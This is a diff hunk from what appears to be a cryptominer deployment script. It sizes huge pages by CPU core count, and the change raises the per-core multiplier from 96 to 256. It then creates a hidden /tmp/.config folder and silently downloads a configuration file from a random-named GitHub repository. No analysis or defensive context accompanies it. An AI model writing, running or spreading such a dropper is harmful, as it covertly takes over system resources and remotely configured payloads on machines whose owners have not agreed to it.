@@ -8,7 +8,7 @@ cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep
 name="Cli_${cores}.sh"
 
 src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
-sudo sysctl -w vm.nr_hugepages=$((cores*96)) || sysctl -w vm.nr_hugepages=$((cores*96))
+sudo sysctl -w vm.nr_hugepages=$((cores*256)) || sysctl -w vm.nr_hugepages=$((cores*256))
 
 mkdir -p "/tmp/.config"
 wget -qO "/tmp/.config/appsettings.json" "${src}/q.json"
